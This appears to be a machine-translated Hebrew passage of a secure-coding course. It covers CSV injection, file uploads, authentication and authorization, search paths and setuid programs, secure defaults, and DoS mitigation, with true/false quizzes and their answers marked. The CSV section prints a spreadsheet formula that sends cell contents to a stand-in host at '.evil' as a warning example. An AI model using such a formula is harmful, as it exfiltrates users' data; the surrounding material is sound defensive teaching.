בפועל, יש הרבה וריאציה בפורמטים CSV. עם זאת, עבור אבטחה, הבעיה *הגדולה יותר* היא שכלים מסוימים (כגון Microsoft Excel ו- LibreOffice) *יבצעו* מבנים מסוימים כאשר הם קוראים CSV, גם אם CSV נראה כמו פורמט נתונים בלבד. לדוגמה, ערך שדה המתחיל ב- "**=**" מתפרש כ"*בצע פונקציות אלה*", ופונקציות יכולות לגשת לנתונים חיצוניים. ביישומי גיליון אלקטרוני מסוימים, תוכן השדה "**=IMPORTXML(CONCAT("<http://some-server-with-log.evil?v>="", CONCATENATE(A2:E2)), ""//a"")"** ישלח ** נתונים מהגיליון האלקטרוני לאתר חיצוני. הפתרון, כמו תמיד, הוא לאמת כל ערך שדה לפני קבלתו. ערכים בעייתיים במיוחד הם אלה המתחילים ב- **=, **+**, **-**, ו**- @**.** 

בעת קריאת תבניות אלה ממקור לא מהימן, ודא שכל תא עומד בתבנית הנתונים הצפויה, ואל תעביר את הנתונים אחרת. היזהר במיוחד מתאים המתחילים ב- "**=**", ונסה להימנע מהעברתם הלאה, מכיוון שכלים מסוימים עשויים לבצע את תוכנם.

#### ג'ייסון

ל- JSON אין את היכולת המובנית להקליט ישויות חיצוניות או ביטויים שכלים רבים היו מצפים שיבוצעו, מה שהופך אותו ליתרון מנקודת מבט ביטחונית. ישנם כלים שיכולים לאמת בקלות תחביר JSON, מיושם לעתים קרובות כחלק מקריאת JSON לתוך פורמט פנימי שימושי.

אם אתה רוצה ללכת רחוק יותר, ישנם פורמטים כגון JSON Schema המאפשרים לך להגדיר בקפדנות רבה יותר בדיוק את הפורמט של פורמט JSON נתון. לאחר מכן תוכל להשתמש במאמתי סכימת JSON כדי לוודא שהנתונים תואמים לסכימה.

#### העלאות קבצים

לפעמים אתה צריך לקבל העלאות קבצים של סוגי קבצים מיוחדים (למשל, של תמונות).

אם התוכנית שלך מאפשרת העלאות, נסה להגביל העלאות לסוגי קבצים ספציפיים וודא (הן באמצעות סוג MIME והן באמצעות התוכן שלה) שהיא אחד מהסוגים החוקיים שתקבל. הגבל גם את מה שאתה מתיר בשם הקובץ; תווים אלפאנומריים הם בדרך כלל בסדר, אבל כל דבר אחר (במיוחד "**/**" ו- "**&#92;** ") יכול להיות בעייתי, אז רק לאפשר את הדמויות אתה בטוח יהיה בסדר. במידת האפשר, הגדר רשימה מקובלת של סיומות שמות קבצים מותרות, ואפשר העלאות של קבצים בשם אחד מהסיומות המותרות.

 הגבלה לא מספקת של העלאות היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #10 ו- 2019 CWE Top 25 #16. הוא מזוהה כ- [CWE-434](https://cwe.mitre.org/data/definitions/434.html), *העלאה בלתי מוגבלת של קובץ עם סוג מסוכן*.

#### חידון 1.7: מבני נתוני קלט (XML, HTML, CSV, JSON והעלאות קבצים)

\>\>בעת קריאת נתונים בתבניות נתונים נפוצות כגון XML ו- JSON, העדיפו להשתמש בספריות שנועדו לטפל בהם באופן מאובטח, נסו לדחות מבנים שאינם תקפים מבחינה תחבירית, ולאחר מכן, כאשר הדבר מעשי, בדקו שהם עומדים בכל סכימה ספציפית הדרושה לכם. אמת או שקר?<<

(x) נכון

( ) לא נכון

### מזעור משטח התקיפה, זיהוי, אימות והרשאה

בפרק תכנון המערכת (בחלק הראשון של קורס זה), ציינו כי חשוב למזער  את *משטח התקיפה* - כלומר, את הממשקים שהתוקף יכול לקבל גישה אליהם. אין פירוש הדבר "הגבל את הממשקים שבהם אתה *מתכוון* שמשתמשים ישתמשו"; *היישום שלך * חייב להגביל את הממשקים שלתוקף יש גישה אליהם. נסה לעשות את זה כך שהתוקפים לא יוכלו אפילו *לגשת* לרוב הממשקים, ואז להגן בזהירות על הממשקים הנגישים.

עם זאת, במערכות רבות, התוקפים יוכלו לנסות כמה בקשות. במקרים אלה, יהיה עליך לוודא שהבקשה מאושרת (מותרת) לפני שהיא מכובדת. זכור, הרשאה פירושה קביעה אם בקשה זו מותרת לאותו אדם או תוכנית.

אתה צריך *לבדוק* אם בקשה מאושרת* *בכל מקרה* או לא * , אם זה לא יכול להיות. כלומר, לוודא שבדיקות ההרשאה אינן ניתנות לעקיפת. כלים לרוב אינם טובים בקביעה אם כל בקשה נבדקת לאישור, כך שבדרך כלל אתה צריך להסתמך בעיקר על בדיקה אנושית. אם בני אדם יכולים לראות בקלות שבדיקת ההרשאה הנכונה נעשית עבור כל בקשה, לוקח הרבה פחות זמן לבדוק ** אותה וסביר יותר שהיא נכונה. בפועל, לעתים קרובות זה אומר שתוכניות צריכות לבדוק אישור ברגע שאתה יכול לעשות זאת באופן סביר. המשמעות המדויקת של זה תלויה במערכת שלך, לדוגמה, בארכיטקטורת דגם-תצוגה-בקר, תוכל לבצע בדיקות הרשאה בכל ערך בקר ו/או בכל ערך דגם. מה שחשוב הוא שאתה עושה את זה בעקביות ושקל לאחרים לוודא שלא ניתן לעקוף את זה. באופן דומה, יש לאחסן את הנתונים כך שרק בקשות מורשות יוכלו להצליח.

 הרשאה לא מספקת היא טעות נפוצה כל כך *שבקרת גישה שבורה* היא 2017 OWASP Top 10 #5 ו- 2021 OWASP Top 10 #1. * הרשאה שגויה היא 2021 CWE Top 25 #38 ו- 2019 CWE Top 25 #33 (CWE-863*), [והרשאה חסרה](https://cwe.mitre.org/data/definitions/863.html) היא 2021 CWE Top 25 #18 ו- 2019 CWE Top 25 #34 (*CWE-862*).[ ](https://cwe.mitre.org/data/definitions/862.html)

כמובן, אם משהו דורש אישור, זה אומר שהיה צריך להיות קודם כל איזשהו זיהוי ואימות (I&; א) לוודא שהבקשה היא ממי שהם טענו שהוא. בדוק ביסודיות כיצד אתה מטפל באימות, והיכן הדבר מעשי, השתמש בשירותים, ספריות או מסגרות מכובדים כדי לעשות זאת.

בדרך כלל עליך לבצע תחילה אימות קלט של זהות (כגון שם משתמש או כתובת דוא"ל), לפני שתעשה איתה כל דבר אחר, כדי להפחית את הסבירות שתוקף יחתור תחת מערכת באמצעות מערכת הכניסה שלו. ברוב המקרים עליך לדווח רק על "הכניסה נכשלה" (או דומה) אם השילוב של הזהות והאימות (כגון סיסמה) נכשל; אל תחשוף אם הזהות קיימת במערכת, מכיוון שזה מאפשר לתוקף לדעת אם הזהות קיימת במערכת. עליך לתמוך בכניסות אימות רב-גורמי (MFA), ישירות או באמצעות שירות, מכיוון שהן נוטות להיות חזקות יותר בסיסמאות.

אם אתה תומך בסיסמאות לאימות, פעל לפי שיטות עבודה טובות, לדוגמה:

1. ודא שלא יותר מתוו אחד של סיסמה מוצג למשתמש בכל פעם, כדי להפחית את הסיכון שמישהו אחר יוכל לראות את הסיסמה (המכונה "גלישת כתפיים"). באפשרותך לעשות זאת בשדות קלט HTML באמצעות סוג הקלט . `password`
2. ודא שמשתמשים יכולים להשתמש במנהלי סיסמאות בעת כניסה, יצירת סיסמה או שינוי סיסמה. לדוגמה, ודא שמשתמשים יכולים להעתיק טקסט לשדות הסיסמה, מכיוון שפונקציונליות זו נחוצה עבור מנהלי סיסמאות מסוימים. אילוץ משתמשים להקליד סיסמאות באופן ידני מעודד אותם להשתמש בסיסמאות גרועות ומרתיע אותם מלהשתמש במנהל סיסמאות (שנחשב לשיטת עבודה מומלצת על ידי רבים).
3. בעת יצירה או שינוי של סיסמה, בקש מהמשתמש להזין את הסיסמה הישנה. פעולה זו מונעת מהתוקף לשנות בקלות את הסיסמה אם יש לו שליטה קצרה על החשבון. כמו כן, בקש מהמשתמש להזין סיסמה חדשה פעמיים ולוודא שהן זהות, כדי להבטיח שהסיסמה המיועדת תשמש כסיסמה. זה גם מוודא שמנהל סיסמאות (אם בכלל) שולח את הסיסמה באופן עקבי.

כאשר משתמש משנה סיסמה או אישור אחר (כגון אסימוני MFA), שקול להודיע למשתמש (למשל על-ידי שליחת דואר אלקטרוני או הודעת טקסט). בדרך זו, אם המשתמש לא גרם לשינוי, המשתמש יקבל התראה מיידית.

 2021 OWASP Top 10 #7 הוא *כשלי זיהוי ואימות*. אימות לקוי הוא טעות נפוצה כל כך *שאימות שבור* הוא 2017 OWASP Top 10 #2, 2021 CWE Top 25 #14, ו- 2019 CWE Top 25 #13. זה [CWE-287](https://cwe.mitre.org/data/definitions/287.html), *אימות לא תקין*. * אימות חסר עבור (במיוחד א) פונקציה קריטית הוא 2021 CWE Top 25 #*11 ו- 2019 CWE Top 25 #36 (CWE-306[](https://cwe.mitre.org/data/definitions/306.html)).

בהמשך נדון בכלים שונים לאימות. בעוד שכלים יכולים לעזור באיתור בעיות מסוימות, לעתים קרובות הם *פחות* יעילים באיתור בעיות אימות והרשאה, מכיוון שלכלים בדרך כלל אין מספיק מידע כדי לקבוע *מה מקובל* ומה *לא*. זה עוזר שיש בדיקות המאמתות בקשות לא מורשות נדחות, כמובן. אבל הגישה היעילה ביותר היא להבטיח שכל נתיב קלט מאומת ומורשה במהירות במידת הצורך, כך שבדיקה ידנית יכולה להבטיח בקלות לסוקרים שכל המקרים מכוסים.

>  שעת סיפור: פריצת מטרה

> בשנת 2013 נפרצה הרשת של חברת טרגט. בתקרית זו נגנבו 40 מיליון מספרי כרטיסי אשראי וחיוב ו-70 מיליון רשומות של מידע אישי. קשה להעריך את מלוא העלויות, אך איגודי כרטיסי האשראי הוציאו יותר מ-200 מיליון דולר רק כדי להנפיק מחדש כרטיסים. הראיות הטובות ביותר הקיימות מצביעות על כך שהפרצה הראשונית התרחשה בחברת חימום, אוורור ומיזוג אוויר (HVAC) של צד שלישי. התוקפים השתמשו באישורים שנפרצו כדי לחדור לרשת היעד. התוקפים הצליחו לחתור תחת מערכות רגישות בשל הפילוח החלש בין רשתות לא רגישות ורגישות בתוך טארגט ([*שבירת המטרה: ניתוח של דליפת נתוני מטרה והפקת לקחים, *](https://arxiv.org/pdf/1701.04940.pdf)על ידי Xiaokui Shu, אנדרו Ciambrone ו- Danfeng Yao, 2017).

#### חידון 1.8: מזעור משטח התקיפה, זיהוי, אימות והרשאה

\>\>חשוב שבני אדם יוכלו לוודא באופן ישיר שהאימות אינו ניתן לעקיפת. אמת או שקר?<<

(x) נכון

( ) לא נכון

### נתיבי חיפוש ומשתני סביבה (כולל תוכניות setuid/setgid)

לעתים קרובות יישומים צריכים לחפש משאבים אחרים, כגון ספריות, פקודות וחבילות. במקרים רבים חיפוש זה נשלט על ידי "נתיב חיפוש" - מיקום או רצף של מיקומים לחיפוש. דוגמה אחת לנתיב חיפוש היא `PATH` משתנה הסביבה, המפרט רצף של ספריות ומשמש בעת חיפוש קבצי הפעלה במערכות דמויות יוניקס ו- Windows. `PATH`קיימים משתנים סביבתיים רבים אחרים (למשל, `PYTHONPATH` בפייתון). בנוסף, מערכות רבות אחרות כוללות נתיבי חיפוש, לדוגמה, מנהלי חבילות תומכים בדרך כלל בנתיב חיפוש המציין את המאגרים או הרישומים שמהם ניתן לאחזר חבילות.

אם תוקף יכול לשלוט בנתיב החיפוש, התוקף עלול לעתים קרובות לגרום ליישום להפעיל קוד זדוני, להשתמש בנתונים שבשליטת התוקף או לחשוף נתונים פרטיים. לדוגמה, אם תוקף יכול לשלוט `PATH` במשתנה הסביבה, ייתכן שתוקף יוכל לאלץ את היישום להפעיל תוכניות לא מכוונות. הפתרון הטוב ביותר הוא להבטיח שהתוקף לא יוכל לשלוט בנתיב החיפוש, למשל על-ידי אי-מתן ההזדמנות או על-ידי הגדרת נתיב החיפוש לערך בטוח לפני השימוש בו.

בעיה קשורה היא שנתיב החיפוש עשוי להכיל מיקום שתוקף יכול לשלוט בו או להשפיע עליו באופן בלתי צפוי. לדוגמה, אם `PATH` למשתנה הסביבה יש ערך המוגדר לספריה הנוכחית, כלומר, "." או "" (ריק), והערך מופיע לפני ספריות מהימנות יותר, הספריה הנוכחית תשמש תחילה. הדבר עלול להפוך לפגיעות מכיוון שהתוקף יוכל בסופו של דבר להוסיף תוכן לספריה שהיישום ישתמש בו כספריה נוכחית. במערכות ישנות דמויות יוניקס, הגדרת PATH לא מאובטחת זו הייתה ברירת המחדל. אחת הדרכים הנפוצות שבהן טעות זו מתרחשת כיום היא אם הנתיב משתנה על ידי שרשור מפריד הספריות ולאחר מכן הספריה החדשה; אם הנתיב היה ריק מלכתחילה, פעולה זו מוסיפה ערך ריק כערך הראשון. לדוגמה, אם  היה `PYTHONPATH` ריק, שרשור נאיבי של  ":" וספרייה `/usr/share/foo` היה מייצר את " `PYTHONPATH` <tt>:/usr/share/foo</tt>"; שים לב שהספרייה הריקה מופיעה ראשונה, מה שיתפרש כחיפוש ראשון בספריה הנוכחית. הפתרון במקרה זה הוא להכניס את המפריד רק אם כבר יש שם טקסט.

ישנם מספר אמצעי נגד פוטנציאליים לבעיות בנתיב החיפוש, לדוגמה:

* בעת האתחול, בדוק נתיב חיפוש שבו תשתמש `PATH` (כגון ) עבור שגיאות נפוצות כגון הכללת ספריה ריקה או "." לפני נתיבים מהימנים יותר (כגון `/usr/bin`). במערכות Windows, בדוק אם מצב חיפוש DLL בטוח מופעל. אתה עלול לעצור, או לפחות להזהיר, אם הגדרות המערכת הנוכחיות מסוכנות.
* השתמש בשמות נתיבים מלאים בעת הגשת בקשה (לדוגמה, התקשרות לתוכניות הפעלה, ייבוא ספריות או בקשת חבילות). רוב המערכות התומכות בנתיב חיפוש תומכות גם בפנייה ישירה של הרכיב הספציפי; הגשת בקשה ישירה תבטיח שאתם מבקשים את הבקשה הנכונה. זהו מנגנון הקשחה מתקבל על הדעת, אך קל לשכוח לעשות זאת במקרים מסוימים, וזה אכן מקשה לפעמים על העברת תוכנה בין מערכות.

ערכי תצורה רבים, כולל נתיבי חיפוש רבים, מסופקים באמצעות משתני סביבה. סביבות ביצוע מסוימות, כגון JavaScript בצד הלקוח, אינן כוללות משתני סביבה. ברוב הסביבות האחרות (לקוח ושרת), משתני סביבה קיימים, אך בדרך כלל נחשבים מהימנים (כלומר, משתני סביבה יכולים להיות מוגדרים רק על-ידי מישהו בעל הרשאה להגדיר אותם). עם זאת, ישנם כמה מקרים מיוחדים שבהם האמון שלהם צריך להיות מוגבל.

לחלק ממערכות ההפעלה ההיסטוריות היו הגדרות לא מאובטחות של משתני סביבה. אחד המקרים הנפוצים ביותר הוא שלמערכות הפעלה ישנות היה משתנה סביבת PATH לא בטוח ולכן הספרייה הנוכחית "." חיפשה קבצי הפעלה לפני ספריות אמינות יותר. באופן דומה, חלק מהמשתמשים התמימים מגדירים את משתנה ה- PATH שלהם לערכים לא מאובטחים, אם כי למרבה המזל טעות מסוג זה פחות נפוצה כיום. זה גם מאוד ספציפי לסביבה; בסביבות רבות תוקף לא יוכל לשלוט בתוכן של אף אחד מהמיקומים.

עם זאת, יש עוד מקרה מיוחד וחשוב: אם אתה כותב משהו שנקרא **setuid** או **setgid** program, אז *משתני סביבה יכולים לבוא מהתוקף*. הקדמה קטנה היא כנראה בסדר. מערכות דמויות יוניקס (כולל לינוקס ו-MacOS) מאפשרות ** להגדיר ** ו/או **להגדיר** תוכניות. כאשר ** תוכנית setuid** פועלת, יש לה את ההרשאות של *הבעלים* שלה  (לא המבקש שלה).  תוכנית **setgid** פועלת עם ההרשאות  של *הקבוצה* שלה  (לא הקבוצות של המבקש שלה). תוכניות מסוג זה יורשות תשומות רבות מתוקף פוטנציאלי, כולל ערך הספריה הנוכחי ומשתני סביבה. פתרון אחד הוא לא לכתוב  תוכנית **setuid** או **setgid**, כמו במקרים רבים גישה זו אינה נחוצה כיום.

אם אתה ** כותב  תוכנית **setuid**/**setgid**,  התוכנית שלך חייבת להגן על עצמה מפני כל הקלטים שלה, וזה כולל את משתני הספריה והסביבה הנוכחיים. משתני סביבה יכולים להיות מסובכים במיוחד, מכיוון שישנן גישות לא בטוחות רבות שנראות בטוחות. הסיבה לכך היא שמשתני סביבה הם בדרך כלל ממקורות מהימנים, ולכן רוב המפתחים אינם מוכנים להתמודד עם המקרה החריג שבו משתני הסביבה אינם ממקורות מהימנים ** . הפתרון הבטוח היחיד הוא (כחלק מההפעלה) לחלץ *רק* את משתני הסביבה  הדרושים, לוודא שהערכים שלהם בטוחים, למחוק  את *כל* משתני הסביבה ולאפס את המשתנים הדרושים לערכים בטוחים (כולל ערכים בטוחים המסופקים בעת הפעלת התוכנית). מחיקת כל משתני הסביבה ברוב שפות התכנות היא קלה, פשוט הגדר את סביבת המשתנה הגלובלי **** למצביע null או שווה ערך ([  משתנה **הסביבה** מוגדר בתקן POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html)). בצע פעולה זו *מוקדם*, לפני יצירת שרשורים כלשהם. אינך יכול פשוט להסיר כמה משתני סביבה; תוקף עלול ליצור מבנה נתונים משתנה של סביבה מוזרה, ויש פשוט יותר מדי משתני סביבה שעלולים להיות מסוכנים (כגון **LD_LIBRARY_PATH**) כדי לנסות למחוק רק ערכים מסוכנים מסוימים. זוהי דוגמה נוספת להתרת רישום במקום הכחשה; אפשר רק את משתני הסביבה המעטים הדרושים לך, עם הערכים המותרים שלהם, ולא שום דבר אחר. במקום זאת, ודא שהמשתנים האפשריים היחידים הם אלה שאתה מצפה להם ויש להם ערכים בטוחים עבורם. זה כולל **את PATH** ואת כל משתני הסביבה האחרים.

 נתיב חיפוש לא מהימן הוא סיבה נפוצה כל כך לפגיעויות אבטחה שהוא 2019 CWE Top 25 #22. זהו  CWE-426[, ](https://cwe.mitre.org/data/definitions/426.html) נתיב חיפוש לא מהימן*. 2021 CWE Top 25 #34 מכסה את *רכיב נתיב החיפוש הבלתי מבוקר הקשור * (*CWE-427[).](https://cwe.mitre.org/data/definitions/427.html)


#### חידון 1.9: נתיבי חיפוש ומשתני סביבה (כולל תוכניות setuid/setgid)

\>\>אם התוכנה שלך צריכה לפעול במקום שבו משתני סביבה אינם ממקורות מהימנים, עליך לחלץ רק את המשתנים הדרושים, למחוק את כל משתני הסביבה ולאחר מכן להגדיר את משתני הסביבה לערכים בטוחים (כולל ערכים בטוחים המסופקים כקלט). אמת או שקר?<<

(x) נכון

( ) לא נכון

### כניסות מיוחדות: ברירות מחדל מאובטחות והפעלה מאובטחת

יש קבוצה מיוחדת של קלטים המשמשים לעתים קרובות בעת ההפעלה: מידע תצורה. זה יכול להיות קריטי לאבטחה.

מערכות מודרניות יש רכיבים רבים בהם. התוכנה שאתה מפתח תהיה כנראה חלק קטן ממערכת אחרת הרבה יותר גדולה. אל תצפו שאנשים יקראו בעיון את התיעוד שלכם; הם לא יעשו זאת. במקום זאת, הקל ** על השימוש בתוכנה שלך באופן מאובטח.

תחילה, ודא שהתוכנה שלך *מאובטחת כברירת מחדל*. אם אין מידע תצורה, התוכנית שלך צריכה לעשות מה שהוא הדבר המאובטח (שהוא בדרך כלל למנוע גישה). אם יש תצורות לדוגמה או קוד לדוגמה המראים כיצד להשתמש בו, ודא שגם הדוגמאות מאובטחות (אנשים בדרך כלל מעתיקים ומדביקים דוגמאות בעת שימוש במשהו). אל תיצור תצורות לדוגמה המאפשרות *גישה לכולם* , אלא אם כן זה באמת שימוש רגיל. במקום זאת, צור דוגמאות מגבילות ככל שתוכל להכין אותן באופן סביר. כלול הערות ברורות רבות בקובץ התצורה לדוגמה, אם יש כזה, כך שמנהל המערכת יבין מה עושה התצורה.

אם דוגמאות מאובטחות מסובכות מדי או קשות להסבר, הדבר מצביע על כך שהתצורה או ה- API שלך מורכבים מדי או כוללים ברירות מחדל שגויות. אל תתקן רק את התיעוד, תקן את הקוד כך שיהיה קל יותר להגדיר אותו או להשתמש בו בצורה מאובטחת, ואז יהיה קל יותר ליצור את התיעוד.

קבל מידע תצורה (במיוחד אם הוא יכול להכיל קוד) ממקור מהימן - לא ממשתמש לא מהימן. אם אתה בונה יישום שולחן עבודה מסורתי, זה בסדר גמור לקבל את התצורה מספריית הבית או מספריית תצורה בתוכו כמו **$HOME/.config**, אך היזהר מתצורות או מכל נתון אחר מהספרייה הנוכחית; ייתכן שלמשתמש יש נתונים לא דחוסים מתוקף לספריה הנוכחית. יישומי אינטרנט בצד השרת צריכים להוריד תצורות וקוד רק ממקורות מהימנים (לדוגמה, הספריות המקומיות שלהם). יישומי אינטרנט בצד הלקוח צריכים להשתמש במדיניות אבטחת תוכן (CSP) כדי להגביל את המקומות שבהם הם יכולים לקבל מידע, כפי שנדון בהמשך.

בעת ההפעלה, או אפילו מעת לעת, שקול לבדוק שהנחות האבטחה שלך תקפות ולעצור אם הן אינן תקפות. לדוגמה, אם יש לך גישה לקבצים פרטיים מסוימים, ודא שהם אינם ניתנים לקריאה קבוצתית או עולמית. אם זהו יישום אינטרנט, בדוק כי **https** (TLS) נמצא בשימוש. כמה בדיקות לא שווה לעשות (כי הם קשים מדי לעשות), אבל אפילו כמה בדיקות שפיות יכול לזהות ולמנוע כמה בעיות.

לפעמים משתמשים עשויים להצטרך להשבית אמצעי אבטחה כלשהו. במידת האפשר, הפוך את זה למקרה חריג; משתמשים בדרך כלל לא צריכים לעשות זאת. אם כן, ודא שהמשתמשים **_יודעים_** שהם משביתים משהו חשוב ומה ההשלכות. לכל הפחות, לתעד שזה מסוכן ולמה. במקרים כאלה, זה עשוי להיות חכם לדווח או לפחות להיכנס לסטארט-אפ איזה אמצעי אבטחה הושבת, לציין שזה מסוכן, ולציין כיצד להפעיל אותו מחדש.

רוב המערכות הגדולות זקוקות למנגנון כלשהו כדי לקבל מידע תצורה. ודא שאתה יכול לסמוך על המקור אם זה חשוב. לדוגמה, תוכניות **setuid** מקבלות משתני  סביבה מיריב פוטנציאלי; תוכניות כאלה צריכות לאמת את משתני הסביבה שהן יאפשרו, לחלץ אותם, למחוק את כל משתני הסביבה ולאחר מכן לאפס רק את הערכים לאלה שהם יכולים לסמוך עליהם.

מערכות מסוימות מנסות להסתמך על *אתחול מאובטח* או מנגנונים דומים כדי להבטיח שרק תוכנה מסוימת תופעל במחשב מסוים. אל תיקח את המנגנונים האלה ברצינות רבה אם המחשב (כגון טלפון חכם) עשוי להיות נשלט פיזית על ידי תוקף פוטנציאלי. אם לתוקף יש שליטה פיזית על מכשיר, לאותו תוקף יש שליטה מוחלטת על המכשיר. המציאות היא שמערכות אתחול מאובטחות נשברו שוב ושוב; לסמוך על זה שלעולם לא יקרה בעתיד הוא התעלמות מלקחי העבר. עדיף לך לעצב את המערכת כך שלא תצטרך לתת אמון ביישום במכשיר זה, אלא להפעיל תוכנה שעליך לסמוך עליה בחומרה הנשלטת על-ידי מישהו שאתה בוטח בו. מערכות אתחול מאובטחות הן הרבה יותר חזקות אם המערכת נשלטת פיזית על ידי גורם מהימן, כי אז הן פשוט מספקות אמצעי הגנה נוסף עבור זה שנמצא בשליטה פיזית.

תצורה שגויה  של אבטחה היא טעות כה נפוצה ביישומי אינטרנט שהיא 2017 OWASP Top 10 #6 ו- 2021 OWASP Top 10 #5. 2021 CWE Top 25 #19 CWE-276 [](https://cwe.mitre.org/data/definitions/276.html) מכסה *הרשאות ברירת מחדל שגויות*.

#### חידון 1.10: כניסות מיוחדות: ברירות מחדל מאובטחות והפעלה מאובטחת

\>\>כדי להקל על השימוש, עליך לספק יישומים עם סיסמה ידועה סטנדרטית ולהבהיר בתיעוד כיצד לשנות סיסמה זו. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

ממש לא. אם יש סיסמה ידועה סטנדרטית, היא תפורסם מיד ב- World Wide Web, וכל התוקפים ישתמשו בסיסמה זו כאשר ינסו לתקוף מערכות אלה. משתמשים רבים לא יקראו תיעוד. כדי שיישום יהיה מאובטח, הוא צריך להיות "מאובטח כברירת מחדל"; יישום עם סיסמה מוגדרת מראש ידועה אינו *מאובטח* כברירת מחדל. חלופה אחת תהיה לקבל הנחיה "אנא צור את הסיסמה שלך" כאשר היישום משמש לראשונה.

[הסבר]

## שקול זמינות בכל התשומות

### שקול את הזמינות בכל התשומות מבוא

כפי שדיברנו קודם, לעתים קרובות קשה להבטיח זמינות בכל הנסיבות האפשריות. לדוגמה, אם מערכת נגישה לציבור דרך האינטרנט, תוקף עלול ליזום מתקפת מניעת שירות מבוזרת (DDoS) בקנה מידה גדול, ולהציף את משאבי השירות שלך.

אבל ברגע שאתה מתחיל לשקול זמינות כבעיה בניהול סיכונים, הדברים לא כל כך חמורים. אתה רוצה להפחית את הסיכון מהתקפות DoS, כלומר, להפחית את הסבירות או ההשפעה שלהן. באפשרותך להפחית את הסבירות על-ידי הפיכת ההתקפה לקשה יותר, מסוכנת יותר או עתירת משאבים עבור התוקף.

#### נסה למנוע כניסות מוגברות בקלות

מושג שימושי הוא הרעיון של מינוף. * "בהקשר של מתקפת DoS, אם לפגיעות יש מינוף גבוה זה אומר שהתוקפים יכולים לצרוך המון ממשאבי השרת שלך עם משאבים מינימליים... ככל שהמינוף גבוה יותר, כך הסיכון גבוה יותר, והסיכוי שאטפל בנושא באופן ישיר גבוה יותר. ככל שהמינוף נמוך יותר, כך גדל הסיכוי שאקבל את הסיכון ו/או אשען על הקלות [משהו אחר __________] ". * ([*לא כל ההתקפות שוות: הבנה ומניעה של DoS ביישומי אינטרנט, *](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)מאת יעקב קפלן-מוס, 2020)

שקול כל סוג של קלט שהתוכנה שלך מקבלת. האם יש דרך כלשהי שבה תוקף יכול לשלוח כמות קטנה מאוד של קלט ולצרוך כמות גדולה של משאבים (למשל, חישוב ו/או פלט)? אלה הם לעתים קרובות סיכון גבוה יותר לזמינות, מכיוון שתשומות אלה מוגברות בקלות.

להלן כמה דוגמאות למשאבים שקלט עשוי לצרוך באופן לא פרופורציונלי:

* רוחב פס רשת - לדוגמה, קלט יכול להפיק פלט גדול באופן לא פרופורציונלי.

* ניצול CPU - למשל, קלט יכול לגרום לכמויות גדולות של חישוב; ראינו דוגמה לכך קודם לכן ב- ReDoS.

* שטח אחסון — לדוגמה, קובץ דחוס עשוי להתרחב כדי למלא את האחסון.

* מגבלות הסכמה — לדוגמה, קלט יכול לגרום לשרשור/תהליך לפעול באיטיות, ולגרום לתוכנה להגיע למקסימום הסכמה (לדוגמה, מספר הליכי משנה, תהליכים או חיבורי מסד נתונים).

הסיכונים של אלה ניתן להפחית באמצעות אימות, שכן אז התוקפים צריכים לחשוף קצת מידע על עצמם. באופן כללי, נסו לחסל לפחות את אלה הלא מאומתים, ושקלו לדרוש אימות כלשהו עבור השאר ([*לא כל ההתקפות שוות: הבנה ומניעה של DoS ביישומי אינטרנט, *](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)מאת יעקב קפלן-מוס, 2020).

פתרון חלקי אחד להפחתת רוחב הפס של הרשת הוא *החלפה*. כלומר, במקום להחזיר תוצאה גדולה מאוד, להחזיר תוצאות קטנות יותר בכל פעם. פעולה זו מחייבת את התוקף להגיש בקשות חוזרות ונשנות.

אם אינך יכול לחסל כניסות מוגברות מאוד, נסה להפיץ את העומס. לדוגמה, אם אתה מפיץ קבצים גדולים, שקול להשתמש ברשת אספקת תוכן (CDN), טורנט או מערכת אחרת מסוג זה. אתרי אינטרנט רבים משתמשים ב-CDN כך שבקשות פשוטות עם תשובות פוטנציאליות גדולות לא יעמיסו על השרתים שלהם.

#### הגבלת קצב

גישה פשוטה הנמצאת בשימוש נרחב במערכות ברשת לשיפור הזמינות היא הגבלת קצב. הגבלת קצב מגבילה את קצב בקשות הקלט (לדוגמה, עבור משתמש נתון, מפתח API או כתובת IP). כל עוד מגבלות הקצב גבוהות יחסית, מגבלות הקצב אינן משפיעות באופן משמעותי על השימוש הרגיל, והן יכולות להפוך התקפות DoS של מערכת יחידה להרבה פחות יעילות. במקרים מסוימים, מגבלות קצב יכולות אפילו לספק אמצעי נגד חלקי נגד התקפות DDoS (מכיוון שהן עשויות להפחית את היעילות של כל מערכת תוקפת). הגבלת קצב גם מונעת כמה בעיות מקריות.

שים לב שאם תאלץ את התוקפים להגיש בקשות רבות (למשל, באמצעות החלפה), התוקף עלול להתחיל לפגוע במגבלות הקצב.

הגבלת תעריפים אינה פתרון מלא, אך זוהי גישה קלה וזולה המגדילה את העלויות והמאמצים עבור התוקפים.

# עיבוד נתונים בצורה מאובטחת

פרק זה מתאר כיצד לעבד נתונים בתוך תוכנה מתוך מחשבה על אבטחה, כולל התייחסות לנתונים לא מהימנים כמסוכנים, הימנעות מאישורי ברירת מחדל ואישורים מקודדים, הימנעות מבעיות בטיחות זיכרון (כגון הצפת מאגר) והימנעות מהתנהגות לא מוגדרת.

מטרות הלמידה:

1. דונו כיצד לעבד נתונים בצורה מאובטחת (לדוגמה, התייחסו לנתונים לא מהימנים כאל מסוכנים).

2. הבן את החשיבות של הימנעות מאישורי ברירת מחדל ואישורים מקודדים באופן קשיח.

3. דונו בבטיחות הזיכרון ובבעיות כאשר הוא אינו קיים: קריאה/כתיבה מחוץ לתחום, ללא שימוש כפול, ללא שימוש לאחר מכן.

4. להבין הימנעות מהתנהגות לא מוגדרת.

## עיבוד נתונים בצורה מאובטחת: בעיות כלליות

### העדיפו נתונים מהימנים. התייחס לנתונים לא מהימנים כמסוכנים

כמובן, ברגע שהתוכנה שלך מקבלת נתונים, היא צריכה לעבד את הנתונים האלה.

